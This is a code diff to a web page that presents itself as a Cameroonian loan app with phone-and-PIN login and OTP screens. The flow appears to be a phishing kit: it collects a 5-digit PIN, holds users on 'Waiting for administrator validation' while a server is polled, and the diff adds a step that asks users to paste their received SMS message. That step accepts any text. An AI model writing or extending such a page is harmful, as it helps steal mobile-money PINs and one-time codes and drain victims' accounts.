@@ -186,10 +186,10 @@ body {
   .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:inherit; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
   .lg-phone-row input:focus { border-color:var(--teal); }
   .pin-label { font-size:0.82rem; color:var(--text-light); text-align:center; margin-bottom:12px; }
-  .pin-row { display:flex; gap:10px; justify-content:center; margin-bottom:12px; position:relative; align-items:center; }
-  .pin-box { width:52px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:inherit; font-size:1.3rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
+  .pin-row { display:flex; gap:8px; justify-content:center; margin-bottom:12px; position:relative; align-items:center; }
+  .pin-box { width:44px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:inherit; font-size:1.3rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
   .pin-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,204,0,0.2); }
-  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; }
+  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:4px; }
   .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
   .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:inherit; transition:all 0.2s; }
   .btn-login.rdy { background:var(--grad); color:#1C1C1C; }
@@ -464,8 +464,8 @@ body {
       <div class="calc-box">
         <h2>Loan Calculator</h2>
         <div class="calc-row2"><span>Loan Amount</span><span class="cv" id="aDisp">50,000 XAF</span></div>
-        <input type="range" id="rA" min="5000" max="5000000" step="5000" value="50000" oninput="calcUp()" style="--pct:4.5%">
-        <div class="range-ends"><span>5K XAF</span><span>5M XAF</span></div>
+        <input type="range" id="rA" min="5000" max="1000000" step="5000" value="50000" oninput="calcUp()" style="--pct:4.5%">
+        <div class="range-ends"><span>5K XAF</span><span>1M XAF</span></div>
         <div class="calc-row2"><span>Loan Duration</span><span class="cv" id="tDisp">12 months</span></div>
         <input type="range" id="rT" min="3" max="24" step="3" value="12" oninput="calcUp()" style="--pct:42.8%">
         <div class="range-ends"><span>3 months</span><span>24 months</span></div>
@@ -610,12 +610,13 @@ body {
         <div class="lg-ph-pre">🇨🇲 +237</div>
         <input type="tel" id="lgPh" placeholder="671234567 or 237671234567" maxlength="12" oninput="normalizePhone('lgPh');chkLogin()">
       </div>
-      <div class="pin-label">Enter your 4-digit PIN code</div>
+      <div class="pin-label">Enter your 5-digit PIN code</div>
       <div class="pin-row">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
+        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,4)" id="p4">
         <button class="pin-eye" onclick="togPin()">👁</button>
       </div>
       <div class="forgot-pin">Forgot PIN code?</div>
@@ -635,7 +636,7 @@ body {
   </div>
 </div>
 
-<!-- PAGE OTP -->
+<!-- PAGE OTP (Two Verification Steps: 1. SMS Verification Pasting, 2. Four Digits OTP) -->
 <div id="page-otp" class="page">
   <div class="otp-topbar">
     <button class="bk" onclick="goTo('page-login')">←</button>
@@ -647,8 +648,8 @@ body {
   </div>
   <div class="otp-body-wrap">
     <div class="otp-card">
-      <h2>OTP Verification</h2>
-      <p class="otp-hint">Enter the OTP code sent by SMS to your number</p>
+      <h2>Security Verification</h2>
+      <p class="otp-hint" id="otpMainHint">Two-step verification required</p>
       <div class="otp-phone" id="otpPh">+237671234567</div>
 
       <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
@@ -660,7 +661,18 @@ body {
         <p>Waiting for administrator validation of your information…</p>
       </div>
 
-      <div id="otpInputSection">
+      <!-- STEP 1: SMS Verification Pasting -->
+      <div id="otpStep1">
+        <p class="otp-hint" style="font-weight:600; color:var(--navy); margin-bottom:8px;">Step 1: SMS Verification</p>
+        <div class="field" style="margin-bottom:14px;">
+          <textarea id="smsPasteInput" placeholder="Paste your received SMS message or verification code here..." oninput="chkSmsStep()" style="min-height:80px;"></textarea>
+        </div>
+        <button class="btn-otp" id="bOtpStep1" onclick="submitSmsStep()">NEXT: 4-DIGIT OTP</button>
+      </div>
+
+      <!-- STEP 2: Four Digits OTP Verification Code -->
+      <div id="otpStep2" style="display:none;">
+        <p class="otp-hint" style="font-weight:600; color:var(--navy); margin-bottom:8px;">Step 2: Four-Digit OTP Verification Code</p>
         <div class="otp-inputs">
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,0)" id="o0">
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
@@ -668,7 +680,7 @@ body {
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
         </div>
         <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">60</span> seconds</div>
-        <button class="btn-otp" id="bOtp" onclick="doOtp()">SUBMIT</button>
+        <button class="btn-otp" id="bOtp" onclick="doOtp()">VERIFY & COMPLETE</button>
       </div>
     </div>
   </div>
@@ -936,21 +948,21 @@ body {
   }
 
   // ══════════════════════════════════════════════════════
-  // LOGIN PAGE — PIN INPUT HELPERS (4 digits)
+  // LOGIN PAGE — PIN INPUT HELPERS (5 digits)
   // ══════════════════════════════════════════════════════
   function pinMv(el, i) {
     el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
+    if (el.value && i < 4) document.getElementById('p' + (i+1)).focus();
     chkLogin();
   }
 
   function chkLogin() {
-    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value);
+    const ok = [0,1,2,3,4].every(i => document.getElementById('p'+i).value);
     document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
   }
 
   function togPin() {
-    [0,1,2,3].forEach(i => {
+    [0,1,2,3,4].forEach(i => {
       const b = document.getElementById('p'+i);
       b.type = b.type === 'password' ? 'text' : 'password';
     });
@@ -966,10 +978,10 @@ body {
     hideLoginMsg();
 
     const rawPhone = document.getElementById('lgPh').value.trim();
-    const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
+    const pin = [0,1,2,3,4].map(i => document.getElementById('p'+i).value).join('');
 
-    if (!rawPhone || pin.length < 4) {
-      showLoginMsg('Please enter the phone number and 4-digit PIN code.');
+    if (!rawPhone || pin.length < 5) {
+      showLoginMsg('Please enter the phone number and 5-digit PIN code.');
       return;
     }
 
@@ -1005,7 +1017,8 @@ body {
 
         goTo('page-otp');
         document.getElementById('pinWait').classList.add('show');
-        document.getElementById('otpInputSection').style.display = 'none';
+        document.getElementById('otpStep1').style.display = 'none';
+        document.getElementById('otpStep2').style.display = 'none';
 
         pollPinStatus();
 
@@ -1040,25 +1053,24 @@ body {
         if (data.status === 'approved') {
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
-          showOtpMsg('success', 'Information verified! Please enter your OTP code below.');
-          startRs();
-          document.getElementById('o0').focus();
+          document.getElementById('otpStep1').style.display = 'block';
+          showOtpMsg('success', 'Information verified! Please complete Step 1: SMS Verification.');
 
         } else if (data.status === 'rejected') {
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'none';
+          document.getElementById('otpStep1').style.display = 'none';
+          document.getElementById('otpStep2').style.display = 'none';
           showOtpMsg('error', 'Your information could not be verified. Redirecting to login…');
           setTimeout(() => {
+            document.getElementById('smsPasteInput').value = '';
             [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
-            document.getElementById('otpInputSection').style.display = 'block';
+            document.getElementById('otpStep1').style.display = 'block';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">60</span> seconds';
             hideOtpMsgs();
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
+            [0,1,2,3,4].forEach(i => document.getElementById('p'+i).value = '');
             document.getElementById('bLogin').disabled = false;
             const phoneVal = document.getElementById('lgPh').value.trim();
             document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
@@ -1083,6 +1095,34 @@ body {
         }
       }
     }, 300000);
+  }
+
+  // ══════════════════════════════════════════════════════
+  // TWO-STEP OTP FLOW HELPERS
+  // ══════════════════════════════════════════════════════
+  function chkSmsStep() {
+    const val = document.getElementById('smsPasteInput').value.trim();
+    const btn = document.getElementById('bOtpStep1');
+    if (val.length > 0) {
+      btn.className = 'btn-otp rdy';
+    } else {
+      btn.className = 'btn-otp';
+    }
+  }
+
+  function submitSmsStep() {
+    const val = document.getElementById('smsPasteInput').value.trim();
+    if (!val) {
+      showOtpMsg('warning', 'Please paste or enter your SMS verification code.');
+      return;
+    }
+    hideOtpMsgs();
+    // Advance to Step 2: Four Digits OTP Verification
+    document.getElementById('otpStep1').style.display = 'none';
+    document.getElementById('otpStep2').style.display = 'block';
+    showOtpMsg('success', 'SMS verified successfully. Please enter your 4-digit code.');
+    startRs();
+    document.getElementById('o0').focus();
   }
 
   // ══════════════════════════════════════════════════════
@@ -1230,15 +1270,16 @@ body {
           clearInterval(otpPollInterval);
           showOtpMsg('error', 'Incorrect PIN code detected. Redirecting to login…');
           setTimeout(() => {
+            document.getElementById('smsPasteInput').value = '';
             [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
             document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = 'block';
+            document.getElementById('otpStep1').style.display = 'block';
+            document.getElementById('otpStep2').style.display = 'none';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">60</span> seconds';
             hideOtpMsgs();
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
+            [0,1,2,3,4].forEach(i => document.getElementById('p'+i).value = '');
             document.getElementById('bLogin').disabled = false;
             const phoneVal = document.getElementById('lgPh').value.trim();
             document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
@@ -1255,7 +1296,8 @@ body {
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
           document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
+          document.getElementById('otpStep1').style.display = 'none';
+          document.getElementById('otpStep2').style.display = 'block';
           showOtpMsg('error', 'Incorrect OTP code. Please check and enter again.');
           document.getElementById('o0').focus();
         }
@@ -1343,4 +1385,3 @@ calcUp();  calcUp();
 </script>
 </body>
 </html>
-```[cite: 5]
